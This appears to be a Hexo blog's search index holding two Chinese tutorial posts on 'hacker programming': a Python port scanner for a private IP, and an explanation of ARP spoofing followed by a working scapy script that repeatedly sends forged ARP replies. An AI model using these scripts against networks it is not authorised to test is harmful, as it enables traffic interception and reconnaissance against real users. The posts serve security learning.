<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>黑客编程（一）：简易端口扫</title>
    <url>/2023/12/15/python(1)/</url>
    <content><![CDATA[<h1 id="黑客编程-—简单端口扫工具"><a href="#黑客编程-—简单端口扫工具" class="headerlink" title="黑客编程 —简单端口扫工具"></a>黑客编程 —简单端口扫工具</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p>
<h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> pyfiglet</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"></span><br><span class="line">ascii_banner = pyfiglet.figlet_format(<span class="string">&quot;PORT SCANNER&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ascii_banner)<span class="comment">#打印艺术字</span></span><br><span class="line"></span><br><span class="line">target = <span class="string">&quot;10.120.132.137&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>* <span class="number">50</span> )</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scannering Target: &quot;</span>+target)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Scannering started at: &quot;</span>+<span class="built_in">str</span>(datetime.now()))<span class="comment">#打印当前扫描时间</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;_&quot;</span>*<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">500</span>):<span class="comment">#端口扫描范围在1~499</span></span><br><span class="line">        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">        socket.setdefaulttimeout(<span class="number">1</span>)<span class="comment">#设置默认超时时间为1秒钟</span></span><br><span class="line"></span><br><span class="line">        result=s.connect_ex((target,port))</span><br><span class="line">        <span class="keyword">if</span> result ==<span class="number">0</span>:<span class="comment">#如果程序正确，打印下列内容</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Port &#123;&#125; is open&quot;</span>.<span class="built_in">format</span>(port))<span class="comment">#将存在端口打印</span></span><br><span class="line">        s.close()</span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:<span class="comment">#如果用户按下键盘中断键，打印消息并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Exiting Program !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">except</span> socket.gaierror:<span class="comment">#无法解析，打印相关内容并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\n Hostname Could Not Be Resolved !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br><span class="line"><span class="keyword">except</span> socket.error:<span class="comment">#主机未响应，打印相关内容并退出</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\ Server not responding !!!!&quot;</span>)</span><br><span class="line">    sys.exit()</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>黑客编程（二）：简单ARP欺骗</title>
    <url>/2023/12/15/python(2)/</url>
    <content><![CDATA[<h1 id="黑客编程-—简单ARP欺骗"><a href="#黑客编程-—简单ARP欺骗" class="headerlink" title="黑客编程 —简单ARP欺骗"></a>黑客编程 —简单ARP欺骗</h1><p>前言：开发永远是最需要去学习的东西！对于网络安全来说更是如此，本末倒置的无脑脚本跑是没有任何技术的！！</p>
<h2 id="ARP欺骗是什么？"><a href="#ARP欺骗是什么？" class="headerlink" title="ARP欺骗是什么？"></a>ARP欺骗是什么？</h2><p>1.ARP协议工作过程<br>假设有两台主机A：192.168.1.1，B：192.168.1.2。当主机A要与主机B通信时，A首先会以广播的方式发送一个ARP请求包，该数据包包含了源IP（192.168.1.1），源MAC（A），目标IP（192.168.1.2），目标MAC（ff:ff:ff:ff:ff:ff）,B收到广播包后会先将A的IP与MAC地址记录到自己的ARP缓存表中，然后给A单播回复ARP replay包，该数据包包含了源IP（192.168.1.2），源MAC（B），目标IP（192.168.1.1），目标MAC（A），A收到该数据包后会将B的IP和MAC记录到自己的ARP缓存中，之后与B的通讯查询缓存即可。</p>
<p>2.ARP欺骗原理<br>由于ARP是无状态协议，所以当一台主机收到一个ARP响应包后不会检查自己是否发送过ARP请求，而是直接将该条记录加载到ARP缓存表中或更新原记录。这样就可以利用向目标主机发送大量的ARP响应包导致目标主机的ARP缓存一致处于错误记录状态，从而达到ARP欺骗目的</p>
<p>2.1单向欺骗<br>单向欺骗是只对目标主机或者网关发起ARP欺骗，攻击者只需要将自己伪装成网关或者一台主机向局域网内其他主机发送ARP响应报文即可</p>
<p>2.1双向欺骗<br>攻击者同时欺骗网关和目标主机，对网关说我是A，对A说我是网关，那么A与网关之间的流量都要经过攻击者的电脑，他们之间的数据也都将被攻击者截获。</p>
<h2 id="脚本详情（注释版）"><a href="#脚本详情（注释版）" class="headerlink" title="脚本详情（注释版）"></a>脚本详情（注释版）</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="comment">#一定要先下载scapy，可以用pip install scapy</span></span><br><span class="line"></span><br><span class="line">target_ip=<span class="string">&quot;目标ip&quot;</span></span><br><span class="line">target_mac=<span class="string">&quot;目标mac&quot;</span></span><br><span class="line"></span><br><span class="line">fake_ip=<span class="string">&quot;伪造ip&quot;</span></span><br><span class="line">fake_mac=<span class="string">&quot;伪造mac&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>():</span><br><span class="line">    arp=ARP()</span><br><span class="line">    <span class="comment">#创建一个ARP对象</span></span><br><span class="line">    <span class="comment">#设置ARP数据包的以下的设置</span></span><br><span class="line">    arp.psrc=fake_ip<span class="comment">#源IP</span></span><br><span class="line">    arp.pdst=target_ip<span class="comment">#目标IP</span></span><br><span class="line">    arp.hwsrc=fake_mac<span class="comment">#源MAC</span></span><br><span class="line">    arp.hwdst=target_mac<span class="comment">#目标MAC</span></span><br><span class="line">    pkt=arp<span class="comment">#将arp对象赋值给pkt变量</span></span><br><span class="line"></span><br><span class="line">    send(pkt)<span class="comment">#发包，进行欺骗</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:<span class="comment">#主函数的入口</span></span><br><span class="line">    i=<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:<span class="comment">#进行死循环</span></span><br><span class="line">        time.sleep(<span class="number">1</span>)<span class="comment">#每次循环延时1秒</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;第&#123;&#125;次攻击&quot;</span>.<span class="built_in">format</span>(i))<span class="comment">#记录是第几次进攻</span></span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">        arp_spoof()<span class="comment">#调用上面的函数</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>blog</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
</search>
